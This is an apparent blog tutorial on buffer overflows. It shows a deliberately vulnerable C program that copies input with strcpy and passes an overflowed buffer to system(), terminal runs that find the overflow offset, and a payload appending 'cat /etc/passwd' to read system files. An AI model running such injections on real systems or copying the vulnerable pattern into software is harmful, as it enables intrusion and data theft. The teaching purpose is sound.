---
layout: post
title: "Buffer Overflow Attack"
title_id: "Buffer Overflow Attack: Beginner level"
description: "Introduction to buffer overflow attack"
category: [technology, old_blog]
tags: [security, bufferoverflow, attack, system, strcpy]
---

It has been very long since I have written something for the blog now,
especially for the last post which I had mentioned that I would come back with
a second part for it. Coming straight to the point, we have it here. :)

Just a recap of what we have talked about before on buffer over flow attacks: Any
attack that exploits the point that the copying of a string to a buffer is not
checked for size(string length) limit can be included in the Buffer Overflow attack
category.

At first we will look at a simple demonstration for the buffer overflow attack.
For this we should have a vulnerable program written. Without loss of
generality we can use the below program for demonstration and if required
further study because as the program size increases, just the complexity to
find the limit for buffer overflowing increases, mostly all other factors
remains same.

{% highlight c %}

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    char cmd[10];
    char buf[500];

    strcpy(buf, argv[1]);
    printf("\n%s   [[[[[%s]]]]]]\n", buf, cmd);
    system(cmd);

    return 0;
}

{% endhighlight %}

What this program does:

Simply copies the first command line arguement to a character
variable buf of size 500. At a later stage, the command list stored in the
variable cmd is executed using the in-built function system.

Vulnarability:

The length of the command line arguement is not compared(checked) with
the size of the destination variable - buf. The part of the input that
overflows the buf array and gets overwritten into the cmd varible which
in-turn gets executed automatically using the system function.
If the final executable is a set-uid program, then the running
process can automatically inherit the the permissions of the owner
program. Say if the owner was root, the attacker gets superuser
power.

What can be done:

Use strncpy instead of strcpy. Strncpy helps us to specify the lenght
of sting that is to be copied to the final destination. On the other
hand the default lenght for stcpy would the maximum string length.
(Reffer MAN pages for strcpy and strncpy)

Below given is the input and output for various lengths of inputs(different
lengths for the string AAAA...AAA):

{% highlight bash %}

BufferOverFlow||22:41$ ./simple `python2.7 -c 'print "A" * 510'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
[[[[[p�k�]]]]]]
sh: $'p\205k\206\377\177': command not found


BufferOverFlow||22:42$ ./simple `python2.7 -c 'print "A" * 511'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
[[[[[@�y$]]]]]]
sh: @�y$: command not found

BufferOverFlow||22:41$ ./simple `python2.7 -c 'print "A" * 512'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
[[[[[]]]]]]

BufferOverFlow||22:42$ ./simple `python2.7 -c 'print "A" * 513'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
[[[[[A]]]]]]
sh: A: command not found

BufferOverFlow||22:41$ ./simple `python2.7 -c 'print "A" * 515'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
[[[[[AAA]]]]]]
sh: AAA: command not found

{% endhighlight %}

This shows us that (for the above given program) when the input size becomes
larger than or equal to 513(remember that the buffer length was 500charactors),
the second variable, cmd starts to get overwritten by the excess or in our case
the overflowed charactors from the input.
Therefore a conclusion can be made that if the input string can be formatted in
such a way that a valid bash command can be appended to the last of 512 random
charactors, that will get executed .i.e., `python2.7 -c 'print "A" * 512 + "<required command>"'`

If the input was `python2.7 -c 'print "A" * 512 + "cat /etc/passwd"'`, the
attacker would be able to read the passwd file from the vulnarable machine.

NOTE:

> If space is to be used outside double or single quotes while giving input
> to the above program, remember to escape it using a backslash in the begining.

This attack can be extended easily:
The statement terminating symol for bash script is a semi colon. So, therefor,
by using a semi colon at the end of each statement to make a small script to be
given as the input, could prove to be more dangerous.


IMPORTANT:

> "Do not use system() from a program with set-user-ID or set-group-ID privileges,
> because strange values for some environment variables might be used to subvert
> system integrity. Use the exec(3) family of functions instead, but not execlp(3)
> or execvp(3).  system() will not, in fact, work properly from programs with
> set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2,
> since bash 2 drops privileges on startup.  (Debian uses a modified bash which does
> not do this when invoked as sh.)." - Linux MAN Pages(SYSTEM(3))

> "If the destination string of a strcpy() is not large enough, then anything might
> happen. Overflowing fixed-length string buffers is a favorite cracker technique for
> taking complete control of the machine. Any time a program reads or copies data into a
> buffer, the program first needs to check that there's enough space. This may be unnecessary
> if  you  can  show that overflow is impossible, but be careful: programs can get changed
> over time, in ways that may make the impossible possible." - Linux MAN Pages(STRCPY(3))


Most programs written in C would have some parts of it using a strcpy function
call. A BOF attack can be designed to exploit this vulnarable function. In the
next level we would remove the system function call and inject the code through
the input(instead of the command list for system function call)which would get
executed in the stack.
